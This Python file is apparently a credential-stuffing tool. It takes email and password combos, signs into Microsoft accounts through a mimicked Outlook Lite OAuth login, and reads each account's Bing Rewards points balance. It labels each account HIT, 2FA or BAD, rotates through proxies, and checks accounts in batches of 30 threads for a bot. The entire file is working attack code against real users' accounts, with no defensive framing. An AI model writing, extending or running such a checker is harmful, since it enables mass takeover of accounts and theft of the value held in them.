#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Rewards Engine - Bing Rewards Points Checker
Extracts available points, account status, and additional info.
Returns: 'HIT' (with points), '2FA', 'BAD', or 'ERROR'
"""

import os
import re
import json
import uuid
import time
import random
import logging
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any

logger = logging.getLogger(__name__)


# ==================== Proxy Manager (optional) ====================

class RewardsProxyManager:
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        self.lock = threading.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self._load_proxies(proxy_file)

    def _load_proxies(self, filepath: str):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        proxy = {
                            'http': f'http://{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
                    elif len(parts) == 4:
                        proxy = {
                            'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")

    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def has_proxies(self) -> bool:
        return len(self.proxies) > 0


# ==================== Core Rewards Checker ====================

class RewardsChecker:
    """
    Bing Rewards points checker – based on the working Sukuna RP Check script.
    """

    def __init__(self, proxy_manager: Optional[RewardsProxyManager] = None, timeout: int = 30):
        self.session = requests.Session()
        self.proxy_manager = proxy_manager
        self.timeout = timeout
        if proxy_manager and proxy_manager.has_proxies():
            self.session.proxies.update(proxy_manager.get_random_proxy())

    def _has_dosubmit(self, text: str) -> bool:
        return ("DoSubmit" in text or
                "document.fmHF.submit" in text or
                ('onload="' in text and 'submit()' in text.lower()))

    def _extract_form_and_submit(self, response, max_hops: int = 8):
        """Follow auto‑submitting forms until no more DoSubmit."""
        current = response
        for _ in range(max_hops):
            text = current.text
            if not self._has_dosubmit(text):
                break
            action_match = re.search(r'<form[^>]*action="([^"]+)"', text, re.IGNORECASE)
            if not action_match:
                break
            form_action = action_match.group(1).replace("&amp;", "&")
            form_data = {}
            for name, value in re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', text):
                if name:
                    form_data[name] = value
            for value, name in re.findall(r'<input[^>]*value="([^"]*)"[^>]*name="([^"]*)"', text):
                if name and name not in form_data:
                    form_data[name] = value
            method_match = re.search(r'<form[^>]*method="([^"]+)"', text, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else "POST"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": current.url,
                "Connection": "keep-alive"
            }
            if method == "GET":
                current = self.session.get(form_action, params=form_data, headers=headers, allow_redirects=True, timeout=self.timeout)
            else:
                current = self.session.post(form_action, data=form_data, headers=headers, allow_redirects=True, timeout=self.timeout)
        return current

    def _detect_account_issue(self, url: str, text: str = "") -> Tuple[Optional[str], Optional[str]]:
        combined = url + " " + text
        if "account.live.com/recover" in combined:
            return "RECOVER", "Password recovery required"
        if "account.live.com/Abuse" in combined:
            return "LOCKED", "Account locked/abuse"
        if "identity/confirm" in combined:
            return "2FA", "2FA/identity confirmation required"
        if "account or password is incorrect" in combined:
            return "BAD", "Invalid credentials"
        return None, None

    def _extract_points(self, page_text: str) -> Optional[int]:
        """Extract available points from dashboard HTML or JSON."""
        patterns = [
            r'"availablePoints"\s*:\s*(\d+)',
            r'"redeemable"\s*:\s*(\d+)',
            r'"lifetimePoints"\s*:\s*(\d+)',
            r'availablePoints["\s:=]+(\d+)',
            r'id="id_rc"[^>]*title="([0-9,]+)',
            r'class="points[^"]*"[^>]*>[\s]*([0-9,]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, page_text)
            if match:
                try:
                    return int(match.group(1).replace(',', ''))
                except ValueError:
                    continue

        # Try to parse dashboard JavaScript object
        dash_match = re.search(r'var\s+dashboard\s*=\s*(\{.*?\});\s*</script>', page_text, re.DOTALL)
        if dash_match:
            try:
                dash = json.loads(dash_match.group(1))
                pts = dash.get("userStatus", {}).get("availablePoints")
                if pts is not None:
                    return int(pts)
            except:
                pass

        # Try API endpoint
        try:
            api_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://rewards.bing.com/dashboard",
                "X-Requested-With": "XMLHttpRequest",
            }
            r_api = self.session.get("https://rewards.bing.com/api/getuserinfo?type=1",
                                      headers=api_headers, allow_redirects=True, timeout=self.timeout)
            if self._has_dosubmit(r_api.text):
                r_api = self._extract_form_and_submit(r_api)
            api_str = r_api.text
            try:
                api_json = r_api.json()
                api_str = json.dumps(api_json)
            except:
                pass
            pts_match = re.search(r'"availablePoints"\s*:\s*(\d+)', api_str)
            if pts_match:
                return int(pts_match.group(1))
        except:
            pass

        return None

    def check(self, email: str, password: str) -> Dict[str, Any]:
        """
        Check Bing Rewards account.
        Returns dict with keys:
            status: 'HIT', '2FA', 'BAD', 'ERROR'
            points: int (if HIT)
            email: str
            password: str
            message: str (optional)
            raw_status: original status from checker
        """
        try:
            # Step 1: IDP Check
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=self.timeout)
            if r1.status_code != 200:
                return {"status": "ERROR", "email": email, "password": password, "message": "IDP check failed"}
            txt = r1.text
            if "Neither" in txt or "Both" in txt or "Placeholder" in txt or "OrgId" in txt:
                return {"status": "BAD", "email": email, "password": password, "message": "Account type not supported"}
            if "MSAccount" not in txt:
                return {"status": "BAD", "email": email, "password": password, "message": "Not a Microsoft account"}

            time.sleep(0.3)

            # Step 2: OAuth Authorize
            url2 = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                    "?client_info=1&haschrome=1&login_hint=" + email +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)
            url_post_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_post_match or not ppft_match:
                return {"status": "ERROR", "email": email, "password": password, "message": "Could not extract login form"}
            post_url = url_post_match.group(1).replace("\\/", "/")
            ppft_val = ppft_match.group(1)

            # Step 3: Login POST
            login_data = (f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&"
                          f"passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&"
                          f"PPFT={ppft_val}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                          f"&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960")
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)

            issue, msg = self._detect_account_issue(r3.headers.get("Location", ""), r3.text)
            if issue:
                if issue in ("2FA", "RECOVER", "LOCKED"):
                    return {"status": "2FA", "email": email, "password": password, "message": msg, "raw_status": issue}
                else:
                    return {"status": "BAD", "email": email, "password": password, "message": msg, "raw_status": issue}

            location = r3.headers.get("Location", "")
            if not location and self._has_dosubmit(r3.text):
                r3_final = self._extract_form_and_submit(r3)
                issue, msg = self._detect_account_issue(r3_final.url, r3_final.text)
                if issue:
                    if issue in ("2FA", "RECOVER", "LOCKED"):
                        return {"status": "2FA", "email": email, "password": password, "message": msg, "raw_status": issue}
                    else:
                        return {"status": "BAD", "email": email, "password": password, "message": msg, "raw_status": issue}
                location = r3_final.url
                code_match = re.search(r'code=([^&"\']+)', r3_final.url + " " + r3_final.text)
                if code_match:
                    location = "?code=" + code_match.group(1)

            if not location:
                nav_match = re.search(r'navigate\("([^"]+)"\)', r3.text)
                if nav_match:
                    location = nav_match.group(1)

            code = None
            if location:
                issue, msg = self._detect_account_issue(location)
                if issue:
                    if issue in ("2FA", "RECOVER", "LOCKED"):
                        return {"status": "2FA", "email": email, "password": password, "message": msg, "raw_status": issue}
                    else:
                        return {"status": "BAD", "email": email, "password": password, "message": msg, "raw_status": issue}
                code_match = re.search(r'code=([^&]+)', location)
                if code_match:
                    code = code_match.group(1)

            # Step 4: Token Exchange (if code available)
            if code:
                token_data = (f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                              f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                              f"&grant_type=authorization_code&code={code}"
                              f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access")
                self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                  data=token_data,
                                  headers={"Content-Type": "application/x-www-form-urlencoded"},
                                  timeout=self.timeout)

            # Step 5: Access Bing Rewards Dashboard
            time.sleep(0.3)
            browser_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive"
            }
            r5 = self.session.get("https://rewards.bing.com/dashboard", headers=browser_headers, allow_redirects=True, timeout=self.timeout)
            if self._has_dosubmit(r5.text):
                r5 = self._extract_form_and_submit(r5)

            # Handle possible extra auth redirects
            if "login.live.com" in r5.url or "login.microsoftonline.com" in r5.url:
                bing_auth = ("https://login.live.com/oauth20_authorize.srf"
                             "?client_id=0000000040170455"
                             "&scope=service::bing.com::MBI_SSL"
                             "&response_type=token"
                             "&redirect_uri=https%3A%2F%2Fwww.bing.com%2Ffd%2Fauth%2Fsignin%3Faction%3Dinteractive"
                             "&prompt=none")
                r_auth = self.session.get(bing_auth, headers=browser_headers, allow_redirects=True, timeout=self.timeout)
                if self._has_dosubmit(r_auth.text):
                    r_auth = self._extract_form_and_submit(r_auth)
                time.sleep(0.3)
                r5 = self.session.get("https://rewards.bing.com/dashboard", headers=browser_headers, allow_redirects=True, timeout=self.timeout)
                if self._has_dosubmit(r5.text):
                    r5 = self._extract_form_and_submit(r5)

            if "login.live.com" in r5.url and "rewards" not in r5.url:
                return {"status": "BAD", "email": email, "password": password, "message": "Could not reach rewards dashboard"}

            # Step 6: Extract points
            page = r5.text
            points = self._extract_points(page)

            if points is not None:
                if points > 0:
                    return {
                        "status": "HIT",
                        "points": points,
                        "email": email,
                        "password": password,
                        "message": f"{points} points available"
                    }
                else:
                    return {"status": "BAD", "email": email, "password": password, "message": "0 points"}

            # Additional checks for enrollment
            if "signup" in r5.url.lower() or "enroll" in page.lower():
                return {"status": "BAD", "email": email, "password": password, "message": "Not enrolled in Rewards"}

            return {"status": "BAD", "email": email, "password": password, "message": "Points not found"}

        except requests.exceptions.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "message": "Timeout"}
        except requests.exceptions.ProxyError:
            return {"status": "ERROR", "email": email, "password": password, "message": "Proxy error"}
        except Exception as e:
            logger.debug(f"Rewards check error for {email}: {e}")
            return {"status": "ERROR", "email": email, "password": password, "message": str(e)}


# ==================== High‑Level RewardsEngine ====================

class RewardsEngine:
    """
    Wrapper for batch checking Bing Rewards accounts.
    Compatible with bot_handlers.py.
    """

    def __init__(self, proxy_file: Optional[str] = None, timeout: int = 30):
        self.proxy_manager = RewardsProxyManager(proxy_file) if proxy_file else None
        self.timeout = timeout

    def check_single(self, email: str, password: str) -> Dict[str, Any]:
        """
        Check a single account.
        Returns dict with keys:
            status: 'HIT', '2FA', 'BAD', 'ERROR'
            points: int (if HIT)
            email, password
            message: optional
        """
        checker = RewardsChecker(self.proxy_manager, timeout=self.timeout)
        result = checker.check(email, password)
        # Ensure consistent keys for bot_handlers
        if result.get("status") == "HIT":
            result.setdefault("points", 0)
        return result

    def check_batch(self, combos: List[Tuple[str, str]], threads: int = 30,
                    progress_callback: Optional[callable] = None) -> List[Dict[str, Any]]:
        """
        Check multiple accounts in batch.
        """
        results = []
        lock = threading.Lock()

        def worker(combo):
            email, pwd = combo
            res = self.check_single(email, pwd)
            with lock:
                results.append(res)
                if progress_callback:
                    progress_callback(len(results))

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Batch worker error: {e}")

        return results